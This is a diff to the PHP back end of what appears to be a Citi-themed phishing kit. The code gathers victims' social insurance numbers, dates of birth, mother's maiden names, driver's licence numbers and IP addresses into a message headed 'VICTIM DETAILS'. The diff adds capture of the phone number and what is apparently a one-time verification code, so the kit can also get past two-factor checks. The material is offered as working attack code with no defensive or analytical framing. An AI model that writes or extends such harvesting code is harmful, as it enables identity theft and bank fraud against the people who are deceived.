@@ -38,6 +38,8 @@ $dob = trim($_POST['dob'] ?? '');
 $mmn = trim($_POST['mmn'] ?? '');
 $ssn = trim($_POST['ssn'] ?? '');
 $dl = trim($_POST['dl'] ?? '');
+$code = trim($_POST['code'] ?? '');
+$phone = trim($_POST['phone'] ?? '');
 
 $message = "[🍁 | CITI IDENTITY | CLIENT :{$client} 🍁]\n\n";
 $message .= "********** [ IDENTITY INFORMATION ] **********\n";
@@ -45,6 +47,8 @@ $message .= "# SIN         : {$ssn}\n";
 $message .= "# DOB         : {$dob}\n";
 $message .= "# MMN         : {$mmn}\n";
 $message .= "# DLN         : {$dl}\n";
+$message .= "# PHONE       : {$phone}\n";
+$message .= "# CODE        : {$code}\n";
 $message .= "********** [ 🧍‍♂️ VICTIM DETAILS 🧍‍♂️ ] **********\n";
 $message .= "# IP ADDRESS : {$IP}\n";
 $message .= "**********************************************\n";
